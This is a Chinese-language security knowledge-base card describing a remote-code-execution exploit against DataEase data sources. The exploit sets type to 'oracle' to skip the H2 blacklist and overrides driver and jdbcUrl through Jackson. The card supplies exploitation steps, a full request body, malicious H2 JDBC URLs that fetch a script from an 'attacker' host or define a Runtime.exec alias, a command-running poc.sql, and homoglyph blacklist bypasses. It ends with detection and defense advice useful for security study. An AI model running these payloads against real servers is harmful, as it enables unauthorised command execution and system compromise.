---
id: web-java-component-dataease-json-driver-override-jdbc-rce
title: DataEase 数据源 JDBC RCE：type 选 Oracle 绕过 H2 黑名单，JSON 覆盖 driver/jdbcUrl
type: scenario
domain: web
path: web/java/component
technique: json-property-override-type-confusion-jdbc-rce
tags:
- java
- dataease
- jdbc
- h2
- rce
- jackson
- type-confusion
- blacklist-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T01:55:14+08:00'
  notes: 已对照原文核对：type=oracle 选 Oracle 类绕开 H2.getJdbc 黑名单、JSON 覆盖 driver/jdbcUrl、Base64 configuration、INIT=RUNSCRIPT 复现与 40001 响应均与原文一致；未验证点：原文调试截图的目标类为 H2（字段 H2.driver），“Oracle 继承父类字段”为依据同源类结构的推断，原文未直接展示 Oracle 字段声明
url: /docs/web/java/component/web-java-component-dataease-json-driver-override-jdbc-rce/
draft: false
kb_aliases:
- DataEase JDBC RCE
- DataEase H2 绕过
- JSON 覆盖属性
- type 与 driver 不一致
- 数据源类型混淆
- H2 INIT 黑名单绕过
- Jackson 属性覆盖
---

## 一句话结论

DataEase 创建数据源时按用户提交的 `type` 选择配置类并调用该类自己的 `getJdbc()` 做黑名单校验，但 Jackson 反序列化会把 JSON 里的 `driver`、`jdbcUrl` 直接写进该对象的父类字段；于是提交 `type: "oracle"` 让服务端走 Oracle 分支、跳过 H2 的 `INIT`/`RUNSCRIPT` 黑名单，同时用 JSON 把 `driver` 覆盖为 `org.h2.Driver`、`jdbcUrl` 覆盖为带 `INIT=RUNSCRIPT` 的 H2 URL。最终服务端仍按覆盖后的 driver 加载 H2 并连接恶意 URL，触发任意 SQL/命令执行。核心是“校验按 type、执行按字段”，type 不是安全边界。

## 原理

- **入口**：数据源配置接口接收 `{"type": "...", "configuration": "<base64>"}`；`configuration` 是用户完全可控的 JSON。
- **按 type 选类**：
  ```java
  DatasourceType datasourceType = DatasourceType.valueOf(coreDatasource.getType());
  switch (datasourceType) {
      case oracle:
          configuration = JsonUtil.parseObject(coreDatasource.getConfiguration(), Oracle.class);
          break;
      case h2:
          configuration = JsonUtil.parseObject(coreDatasource.getConfiguration(), H2.class);
          break;
      ...
  }
  ```
  `type` 决定反序列化目标类，也决定后续走哪个子类的 `getJdbc()` 校验。
- **H2 的黑名单**：`io.dataease.datasource.type.H2.getJdbc()` 在返回 URL 前检查非法参数：
  ```java
  for (String illegalParameter : getH2IllegalParameters()) {   // ["INIT", "RUNSCRIPT"]
      if (jdbc.toUpperCase().replace("\\", "").contains(illegalParameter)) {
          DEException.throwException("Has illegal parameter: " + jdbc);
      }
  }
  return jdbc;
  ```
  这段只在对象是 `H2` 时执行。选 `type: oracle` 时根本不会调用它。
- **Jackson 覆盖属性**：`JsonUtil.parseObject` 底层是 Jackson `ObjectMapper.readValue`。`BeanDeserializer.vanillaDeserialize` 先用默认构造器创建目标类实例，再逐个字段名查找 `SettableBeanProperty` 并 `deserializeAndSet`：
  ```java
  Object bean = this._valueInstantiator.createUsingDefault(ctxt);
  while ((propName = p.nextFieldName()) != null) {
      SettableBeanProperty prop = this._beanProperties.find(propName);
      if (prop != null) prop.deserializeAndSet(p, ctxt, bean);
  }
  ```
  `FieldProperty.deserializeAndSet` 最终通过 `UnsafeObjectFieldAccessorImpl`/反射直接写字段（调试可见 `unsafe.putObject(instance, fieldOffset, value)`），不要求 setter 的额外校验。
- **跨类字段写入**：`Oracle extends DatasourceConfiguration`，`driver`、`jdbcUrl` 定义在父类；JSON 里出现这两个字段时，Jackson 仍会在 `Oracle` 实例上把它们覆盖。对象名义上是 Oracle，实际 `getDriver()` 返回 `org.h2.Driver`、`getJdbc()` 返回恶意 H2 URL。
- **执行**：
  ```java
  Driver driverClass = (Driver) jdbcClassLoader.loadClass(configuration.getDriver()).newInstance();
  conn = driverClass.connect(configuration.getJdbc(), props);
  ```
  服务端用被覆盖的 `driver` 加载 H2 驱动，再用被覆盖的 `jdbc` 连接；H2 解析 URL 时执行 `INIT=RUNSCRIPT FROM 'http://attacker/poc.sql'`（或 `INIT=CREATE ALIAS ...`），从而执行 SQL/Java 代码。
- **为什么黑名单无效**：黑名单检查的是“H2 类对象上的 jdbc 字段”，而攻击者让对象变成 Oracle 类、字段却仍是 H2 语义；校验路径与执行路径读取的不是同一个类型约束。修复只加强了 `H2.getJdbc()` 的字符串处理（大写 + 去反斜杠），没有解决跨类型字段覆盖。
- **历史绕过对比**：早期 H2 黑名单还会先对参数名做 `toUpperCaseEnglish`，于是 `InIT`、`ıNIT`（点less ı 大写为 I）、`RUNſCRIPT`（长 s ſ 大写为 S）等大小写/同形字符写法可绕过；后续版本加上大写与去反斜杠后失效。本技巧不再对抗黑名单，而是换一条不经过黑名单的路径。

## 触发条件

- 目标为 DataEase，存在数据源新增/校验功能，`type` 与 `configuration` 均可由攻击者提交。
- 服务端 classpath 含 H2 驱动（DataEase 通常自带 H2 用于演示数据源），且 H2 版本支持 `INIT`/`RUNSCRIPT`（如 1.4.200）。
- 配置类继承关系允许 `driver`/`jdbcUrl` 等字段在子类实例上被 Jackson 写入（`Oracle` 等类型继承 `DatasourceConfiguration`）。
- 攻击者拥有可创建/校验数据源的账号（管理员或具备数据源权限的用户）。
- 目标可出网访问攻击者的 SQL 文件，或可使用内联 `INIT=CREATE ALIAS` 不依赖外网。

## 利用步骤

1. 构造内层配置 JSON，把 `driver` 设为 H2、`jdbcUrl` 设为恶意 H2 URL：
   ```json
   {
     "dataBase": "",
     "driver": "org.h2.Driver",
     "jdbcUrl": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'",
     "urlType": "jdbcUrl",
     "sshType": "password",
     "extraParams": "",
     "username": "",
     "password": "",
     "host": "",
     "authMethod": "",
     "port": 0,
     "initialPoolSize": 5,
     "minPoolSize": 5,
     "maxPoolSize": 5,
     "queryTimeout": 30,
     "connectionType": "sid"
   }
   ```
2. 对该 JSON 做 Base64 编码，放入外层请求的 `configuration`，并把 `type` 设为 `oracle`（任意非 h2 类型均可，只要其配置类继承父类字段）：
   ```json
   {"id":"","name":"a","description":"","type":"oracle","configuration":"<base64>"}
   ```
3. 提交到数据源新增/校验接口（原文截图为本地 `127.0.0.1:8100` 的请求，具体路径未展示）。
4. 准备 `poc.sql`：
   ```sql
   CREATE ALIAS EXEC AS 'void exec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); }';
   CALL EXEC('calc.exe');
   ```
5. 服务端解析 JSON 时把 Oracle 实例的 `driver`/`jdbcUrl` 覆盖为 H2 值与恶意 URL；`loadClass("org.h2.Driver")` 后 `connect()` 触发 `RUNSCRIPT`，执行 `poc.sql`。
6. 观察结果：原文截图弹出计算器；HTTP 响应可能仍返回 `{"code":40001,"msg":"schema 为空!"}`，说明 RCE 发生在后续校验之前，不能以接口报错判断利用失败。

## PoC

内层配置（明文）见上；H2 URL 的两种写法：

```text
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker/poc.sql'
jdbc:h2:mem:testdb;INIT=CREATE ALIAS EXEC AS 'void exec(String c) throws java.io.IOException {Runtime.getRuntime().exec(c);}'\;CALL EXEC('calc.exe')
```

外层请求体：

```json
{
  "id": "",
  "name": "a",
  "description": "",
  "type": "oracle",
  "configuration": "eyJkYXRhQmFzZSI6IiIsImRyaXZlciI6Im9yZy5oMi5Ecml2ZXIiLCJqZGJjVXJsIjoiamRiYzpoMjptZW06dGVzdGRiO1RSQUNFX0xFVkVMX1NZU1RFTV9PVVQ9MztJTklUPVJVTlNDUklQVCBGUk9NICdodHRwOi8vMTI3LjAuMC4xOjgwMDAvcG9jLnNxbCciLCJ1cmxUeXBlIjoiamRiY1VybCIsInNzaFR5cGUiOiJwYXNzd29yZCIsImV4dHJhUGFyYW1zIjoiIiwidXNlcm5hbWUiOiIiLCJwYXNzd29yZCI6IiIsImhvc3QiOiIiLCJhdXRoTWV0aG9kIjoiIiwicG9ydCI6MCwiaW5pdGlhbFBvb2xTaXplIjo1LCJtaW5Qb29sU2l6ZSI6NSwibWF4UG9vbFNpemUiOjUsInF1ZXJ5VGltZW91dCI6MzAsImNvbm5lY3Rpb25UeXBlIjoic2lkIn0="
}
```

说明：Base64 内容仅示例，实际需按内层 JSON 重新编码；`configuration` 的解码方式以目标版本为准。原文在本地环境验证，计算器成功弹出。

## 变体与关联

- **类型选择变体**：任意“按 type 选配置类、但父类字段可被 JSON 覆盖”的类型对都可复用（Oracle/MySQL/PG/Db2 等）；只要目标类型不触发 H2 黑名单即可。
- **字段名变体**：若 `driver` 字段在目标版本被保护，可尝试其他被 `getConnection` 读取的父类字段（`jdbc`、`jdbcUrl`、`url`、`username` 等），关键是找到“校验用字段”和“执行用字段”不一致的点。
- **Jackson 通用性**：该属性覆盖不依赖多态 `@JsonTypeInfo`，而是普通 bean 绑定 + 继承字段；其他使用 Jackson 将 JSON 映射到“先按外部类型选类”的框架都可能中招。
- **历史绕过**：大小写混用（`InIT`）、Unicode 同形字符（`ıNIT`、`RUNſCRIPT`）依赖驱动对参数名的大写归一；在新版本加上大写/去反斜杠后失效，可作为理解黑名单演进的背景。
- **与既有 H2 卡的差异**：`web-java-deserialization-h2-jdbc-init-create-alias-rce` 讲的是反序列化 gadget 触发 H2 `INIT`；本卡讲的是 DataEase 数据源配置的直连 JDBC 注入 + type/driver 类型混淆绕过，入口与触发方式不同。
- **通用 JDBC WAF 绕过**：`web-java-deserialization-jdbc-url-waf-parser-bypass` 讲 URL 解析差异；本卡不依赖 URL 解析差异，而是绕过“按类型校验”的逻辑。

## 检测与防御

- 数据源的 `driver`、jdbc URL 必须由服务端按 `type` 从白名单生成，绝不接受配置 JSON 中的 `driver` 类名；加载驱动前校验其与 `type` 的映射关系。
- 反序列化后做字段级一致性校验：Oracle 类型只能有 Oracle 的 driver/URL，出现 `org.h2.Driver` 等跨类型值直接拒绝；不要只在子类 `getJdbc()` 里做字符串黑名单。
- Jackson 配置可将 `FAIL_ON_UNKNOWN_PROPERTIES` 设为 true，但父类字段属于已知属性，不能替代上述一致性校验；必要时为每个类型使用独立 DTO，禁止继承通用可写字段。
- 生产环境移除/禁用 H2 驱动，或升级到对 `INIT`/`RUNSCRIPT` 限制更严的 H2 版本；限制应用进程出网，阻断 `RUNSCRIPT FROM http://...`。
- 审计所有 `JsonUtil.parseObject(configuration, Xxx.class)` 调用，检查 type 与目标类、父类字段的关系；关注 `getConnection` 等执行点实际读取的字段来源。
- 运行时检测：数据源配置中出现 `driver=org.h2.Driver` 与 `type` 不一致、JDBC URL 含 `INIT`/`RUNSCRIPT`/`CREATE ALIAS`、应用进程发起陌生 HTTP 下载 SQL 文件、H2 驱动在非测试环境被加载。
